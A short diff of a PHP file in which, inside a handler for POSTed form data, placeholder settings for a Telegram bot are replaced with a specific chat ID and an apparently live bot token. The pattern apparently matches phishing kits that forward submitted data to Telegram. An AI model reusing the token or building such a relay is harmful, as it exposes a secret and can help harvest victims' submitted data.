@@ -5,8 +5,8 @@ if (!empty($_POST)) {
     class Telegram
     {
 
-        const CHAT_ID = user id;
-        const TOKEN = 'your bot token';
+        const CHAT_ID = 6765826972;
+        const TOKEN = '6324057598:AAGQL9l3OEqelotYD-9IshMa3H3JGx4_MMA';
 
         public static function sendMessage($message)
         {
